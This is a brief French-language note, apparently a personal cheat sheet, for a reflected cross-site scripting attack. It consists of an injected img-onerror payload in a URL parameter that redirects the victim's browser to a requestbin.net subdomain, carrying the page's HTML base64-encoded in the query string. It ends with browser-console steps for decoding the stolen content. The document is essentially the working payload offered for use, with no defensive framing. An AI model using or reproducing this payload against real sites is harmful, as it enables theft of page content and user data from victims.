https://requestbin.net/

Dans l'url :

http://xxx.com/page?user=%3Cimg%20src=1%20onerror="window.top.location='//xxx.requestbin.net/?rte='.concat(btoa(encodeURIComponent(document.body.innerHTML)))">

dans console chrome :
Atob("resultat")
decodeURIComponent("resultat de atob")
